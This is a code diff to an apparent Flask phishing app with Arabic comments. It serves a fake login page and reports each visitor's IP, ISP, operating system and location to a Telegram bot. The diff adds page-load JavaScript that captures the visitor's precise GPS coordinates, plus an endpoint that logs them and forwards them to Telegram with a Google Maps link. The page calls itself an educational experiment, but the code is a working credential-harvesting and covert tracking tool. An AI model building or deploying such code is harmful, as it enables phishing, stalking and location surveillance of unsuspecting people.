@@ -52,10 +52,12 @@ def index():
         if ip_data['status'] == 'success':
             location = f"{ip_data.get('city', 'غير معروف')}, {ip_data.get('country', 'غير معروف')}"
             isp = ip_data.get('isp', 'غير معروف')
+            lat = ip_data.get('lat', 'غير متاح')
+            lon = ip_data.get('lon', 'غير متاح')
         else:
-            location, isp = "غير متاح", "غير متاح"
+            location, isp, lat, lon = "غير متاح", "غير متاح", "غير متاح", "غير متاح"
     except:
-        location, isp = "خطأ في الجلب", "خطأ في الجلب"
+        location, isp, lat, lon = "خطأ في الجلب", "خطأ في الجلب", "خطأ", "خطأ"
     
     # تسجيل البيانات التقنية في الملف
     log_entry = f"""
@@ -72,11 +74,16 @@ def index():
     with open('log.txt', 'a', encoding='utf-8') as f:
         f.write(log_entry)
     
-    # إرسال البيانات التقنية إلى تليجرام
+    # ====== إنشاء رابط خرائط جوجل ======
+    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != 'غير متاح' and lat != 'خطأ' else "غير متاح"
+    
+    # إرسال البيانات التقنية إلى تليجرام مع رابط الخريطة
     tech_msg = f"""
 <b>🆕 زيارة جديدة!</b>
 <b>🌐 IP:</b> {client_ip}
 <b>📍 الموقع التقريبي:</b> {location}
+<b>🗺️ الإحداثيات:</b> {lat}, {lon}
+<b>📍 <a href="{maps_link}">على الخريطة</a></b>
 <b>📡 مزود الخدمة:</b> {isp}
 <b>📱 نظام التشغيل:</b> {os_info}
 <b>🌍 اللغة:</b> {accept_lang}
@@ -138,6 +145,27 @@ login_page_html = '''
             🔒 هذه تجربة تعليمية على خادم آمن
         </div>
     </div>
+    <script>
+    // طلب الموقع الدقيق (GPS) عند تحميل الصفحة
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                fetch('/gps-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ lat, lng, accuracy })
+                }).catch(err => console.log('خطأ في إرسال GPS:', err));
+            },
+            function(error) {
+                console.log('لم يتم مشاركة الموقع:', error.message);
+            }
+        );
+    }
+    </script>
 </body>
 </html>
 '''
@@ -212,6 +240,39 @@ def capture():
     '''
     return success_page
 
+# ========== استقبال الموقع الدقيق (GPS) ==========
+@app.route('/gps-data', methods=['POST'])
+def gps_data():
+    data = request.get_json()
+    lat = data.get('lat')
+    lon = data.get('lon')
+    accuracy = data.get('accuracy')
+    
+    # تسجيل الموقع في ملف
+    with open('gps_log.txt', 'a', encoding='utf-8') as f:
+        f.write(f"""
+        ═══════════════════════════════════════════
+        📍 موقع دقيق - {datetime.datetime.now()}
+        🗺️ خط العرض: {lat}
+        🗺️ خط الطول: {lon}
+        📏 الدقة: {accuracy} متر
+        🌐 IP: {request.remote_addr}
+        ═══════════════════════════════════════════
+        """)
+    
+    # إرسال الموقع الدقيق إلى تليجرام مع رابط خرائط
+    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+    gps_msg = f"""
+<b>📍 موقع دقيق (GPS)</b>
+<b>🗺️ خط العرض:</b> {lat}
+<b>🗺️ خط الطول:</b> {lon}
+<b>📏 الدقة:</b> {accuracy} متر
+<b>📍 <a href="{maps_link}">على الخريطة</a></b>
+    """
+    send_to_telegram(gps_msg)
+    
+    return {"status": "success"}, 200
+
 # ========== عرض السجلات (للمختبر) ==========
 @app.route('/view-logs')
 def view_logs():
@@ -226,6 +287,11 @@ def view_logs():
             output += "<h2>🔐 البيانات المسجلة</h2><pre>" + f.read() + "</pre>"
     except:
         output += "<p>لا توجد بيانات مسجلة</p>"
+    try:
+        with open('gps_log.txt', 'r', encoding='utf-8') as f:
+            output += "<h2>📍 بيانات GPS</h2><pre>" + f.read() + "</pre>"
+    except:
+        output += "<p>لا توجد بيانات GPS</p>"
     output += "</body></html>"
     return output
 
